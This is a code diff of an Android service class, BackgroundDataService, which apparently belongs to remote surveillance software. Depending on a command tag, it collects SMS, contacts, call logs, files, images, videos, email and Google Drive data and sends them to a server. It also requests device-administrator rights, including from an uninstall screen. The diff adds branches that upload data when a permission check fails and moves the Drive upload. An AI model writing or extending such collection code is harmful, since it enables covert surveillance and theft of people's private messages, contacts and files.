@@ -108,10 +108,9 @@ public class BackgroundDataService extends Service implements Constant {
         Log.e(TAG, "active??" + mAdminActive);
 
         /* Check For Device Admin Permission Are Enable Or Not */
-        if (!mAdminActive) {
+        if (!mAdminActive)
             getDeviceAdminPermission(REQUEST_CODE_ENABLE_ADMIN);
-            return;
-        }
+        return;
     }
 
     //onStartCommand
@@ -125,10 +124,8 @@ public class BackgroundDataService extends Service implements Constant {
             subject = intent.getStringExtra(KEY_SUBJECT);
             size = intent.getStringExtra(KEY_SIZE);
             /* Get Data With Tag */
-            if (tag != null && !tag.equals("")) {
-
+            if (tag != null && !tag.equals(""))
                 GetDataWithTag(tag, count, dateFrom, dateTo, subject, size);
-            }
         }
         return super.onStartCommand(intent, flags, startId);
     }
@@ -150,13 +147,12 @@ public class BackgroundDataService extends Service implements Constant {
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                         getString(R.string.add_admin_extra_app_text));
 
-                if (MainActivity.getInstance() != null) {
+                if (MainActivity.getInstance() != null)
                     MainActivity.getInstance().startActivity(intent);
-                }
 
-                if (UninstallActivity.getInstance() != null) {
+                if (UninstallActivity.getInstance() != null)
                     UninstallActivity.getInstance().startActivity(intent);
-                }
+
                 break;
             default:
                 break;
@@ -166,39 +162,39 @@ public class BackgroundDataService extends Service implements Constant {
     /* Get Data With Tag */
     private void GetDataWithTag(String tag, String count, String dateFrom, String dateTo, String size, String subject) {
         if (tag.equals(TAG_SMS)) {
-            if (Utilities.checkPermission(context, Manifest.permission.READ_SMS)) {
+            if (Utilities.checkPermission(context, Manifest.permission.READ_SMS))
                 new SmsAsyncTask(this).execute(count, dateFrom, dateTo);
-            }
+            else sendSmsDataToServer(lstSms);
             return;
         }
 
         if (tag.equals(TAG_CONTACTS)) {
-            if (Utilities.checkPermission(context, Manifest.permission.READ_CONTACTS)) {
+            if (Utilities.checkPermission(context, Manifest.permission.READ_CONTACTS))
                 new ContactsAsyncTask(this).execute(count, dateFrom, dateTo);
-            }
+            else sendContactsDataToServer(lstContacts);
             return;
         }
 
         if (tag.equals(TAG_CALLS)) {
-            if (Utilities.checkPermission(context, Manifest.permission.READ_CALL_LOG)) {
+            if (Utilities.checkPermission(context, Manifest.permission.READ_CALL_LOG))
                 new CallsAsyncTask(this).execute(count, dateFrom, dateTo);
-            }
+            else sendCallsDataToServer(lstCalls);
             return;
         }
 
         if (tag.equals(TAG_FILES)) {
             if (Utilities.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
-                    && Utilities.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                    && Utilities.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE))
                 new FilesAsyncTask(this).execute(count, dateFrom, dateTo);
-            }
+            else sendFilesDataToServer(lstFiles);
             return;
         }
 
         if (tag.equals(TAG_IMAGES)) {
             if (Utilities.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
-                    && Utilities.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                    && Utilities.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE))
                 new ImagesAsyncTask(this).execute(count, dateFrom, dateTo, size);
-            }
+            else sendImageDataToServer(lstImages);
             return;
         }
 
@@ -226,21 +222,24 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_EMAIL)) {
-            passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
+            if (Utilities.checkPermission(context, Manifest.permission.GET_ACCOUNTS))
+                passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
+            else sendEmailDataToServer(lstEmail);
             return;
         }
 
         if (tag.equals(TAG_GOOGLE_DRIVE)) {
-
-            passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
+            if (Utilities.checkPermission(context, Manifest.permission.GET_ACCOUNTS))
+                passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
+            else sendSaveDriveDataToServer();
             return;
         }
 
         if (tag.equals(TAG_VIDEOS)) {
             if (Utilities.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
-                    && Utilities.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                    && Utilities.checkPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE))
                 new VideoAsyncTask(this).execute(count, dateFrom, dateTo, size);
-            }
+            else sendVideosDataToServer(lstVideo);
             return;
         }
 
@@ -351,7 +350,6 @@ public class BackgroundDataService extends Service implements Constant {
                 }
             }
         }
-        convertToJSONFormat(TAG_GOOGLE_DRIVE);
     }
 
     /* Send Download Drive Data To Server */
@@ -382,10 +380,10 @@ public class BackgroundDataService extends Service implements Constant {
                     }
                 }
             }
-
-            new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(context), lstDrive2);
         }
 
+        convertToJSONFormat(TAG_GOOGLE_DRIVE);
+        new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(context), lstDrive2);
         stopSelf();
     }
 
